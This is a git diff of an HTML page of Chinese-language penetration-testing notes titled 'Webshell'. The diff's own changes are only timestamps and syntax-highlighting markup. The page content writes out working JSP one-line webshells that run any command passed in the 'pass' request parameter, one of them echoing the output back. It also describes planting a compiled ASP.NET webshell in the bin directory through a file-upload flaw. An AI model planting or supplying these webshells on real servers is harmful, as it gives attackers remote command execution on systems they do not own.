@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-09-12 Mon 22:21 -->
+<!-- 2022-09-30 Fri 20:57 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Webshell</title>
@@ -15,9 +15,9 @@
 <header>
 <h1 class="title">Webshell</h1>
 </header>
-<div id="outline-container-org46b3f56" class="outline-2">
-<h2 id="org46b3f56">PHP Webshell</h2>
-<div class="outline-text-2" id="text-org46b3f56">
+<div id="outline-container-org8e4d013" class="outline-2">
+<h2 id="org8e4d013">PHP Webshell</h2>
+<div class="outline-text-2" id="text-org8e4d013">
 <p>
 一句话木马：
 </p>
@@ -76,14 +76,14 @@ function iJG($BHM) {
 </div>
 </div>
 
-<div id="outline-container-orgf96dcf6" class="outline-2">
-<h2 id="orgf96dcf6">JSP Webshell</h2>
-<div class="outline-text-2" id="text-orgf96dcf6">
+<div id="outline-container-orgbf2ac7d" class="outline-2">
+<h2 id="orgbf2ac7d">JSP Webshell</h2>
+<div class="outline-text-2" id="text-orgbf2ac7d">
 <p>
 一句话木马：
 </p>
 <div class="org-src-container">
-<pre class="src src-java">&lt;%Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>));%&gt;
+<pre class="src src-java">&lt;%Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>;%&gt;
 </pre>
 </div>
 
@@ -92,23 +92,23 @@ function iJG($BHM) {
 </p>
 <div class="org-src-container">
 <pre class="src src-java">&lt;%
-    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>)).getInputStream();
+    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime<span style="color: #707183;">()</span>.exec<span style="color: #707183;">(</span>request.getParameter<span style="color: #7388D6;">(</span><span style="color: #008000;">"pass"</span><span style="color: #7388D6;">)</span><span style="color: #707183;">)</span>.getInputStream<span style="color: #707183;">()</span>;
     <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">a</span> = -<span style="color: #D0372D;">1</span>;
-    <span style="color: #6434A3;">byte</span>[] <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span>[<span style="color: #D0372D;">2048</span>];
-    out.print(<span style="color: #008000;">"&lt;pre&gt;"</span>);
-    <span style="color: #0000FF;">while</span>((a=in.read(b))!=-<span style="color: #D0372D;">1</span>){
-        out.println(<span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span>(b));
-    }
-    out.print(<span style="color: #008000;">"&lt;/pre&gt;"</span>);
+    <span style="color: #6434A3;">byte</span><span style="color: #707183;">[]</span> <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span><span style="color: #707183;">[</span><span style="color: #D0372D;">2048</span><span style="color: #707183;">]</span>;
+    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;pre&gt;"</span><span style="color: #707183;">)</span>;
+    <span style="color: #0000FF;">while</span><span style="color: #707183;">(</span><span style="color: #7388D6;">(</span>a=in.read<span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>!=-<span style="color: #D0372D;">1</span><span style="color: #707183;">){</span>
+        out.println<span style="color: #7388D6;">(</span><span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span><span style="color: #909183;">(</span>b<span style="color: #909183;">)</span><span style="color: #7388D6;">)</span>;
+    <span style="color: #707183;">}</span>
+    out.print<span style="color: #707183;">(</span><span style="color: #008000;">"&lt;/pre&gt;"</span><span style="color: #707183;">)</span>;
 %&gt;
 </pre>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org9e1c394" class="outline-2">
-<h2 id="org9e1c394">ASP Webshell</h2>
-<div class="outline-text-2" id="text-org9e1c394">
+<div id="outline-container-orgbf753d9" class="outline-2">
+<h2 id="orgbf753d9">ASP Webshell</h2>
+<div class="outline-text-2" id="text-orgbf753d9">
 <p>
 .NET 优先加载 bin 目录下的程序，例如 index.aspx -&gt; /bin/index.dll ，这时任意目录均能处理 index.aspx ，如果存在任意文件上传漏洞的话，就可以将编译好的 webshell 上传到 bin 目录。
 </p>
@@ -122,9 +122,9 @@ function iJG($BHM) {
 </div>
 </div>
 
-<div id="outline-container-orga0558ca" class="outline-3">
-<h3 id="orga0558ca">Find Vulnerabilities / Code Audit</h3>
-<div class="outline-text-3" id="text-orga0558ca">
+<div id="outline-container-orga43336b" class="outline-3">
+<h3 id="orga43336b">Find Vulnerabilities / Code Audit</h3>
+<div class="outline-text-3" id="text-orga43336b">
 <ol class="org-ol">
 <li>在得到安装包的情况下，用 ILSpy 反编译</li>
 <li>查找 Upload, File, Download 等关键词</li>
@@ -133,9 +133,9 @@ function iJG($BHM) {
 </div>
 </div>
 
-<div id="outline-container-org5dc7ce0" class="outline-3">
-<h3 id="org5dc7ce0">Global.asax</h3>
-<div class="outline-text-3" id="text-org5dc7ce0">
+<div id="outline-container-org1167ce7" class="outline-3">
+<h3 id="org1167ce7">Global.asax</h3>
+<div class="outline-text-3" id="text-org1167ce7">
 <p>
 文件说明<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
 </p>
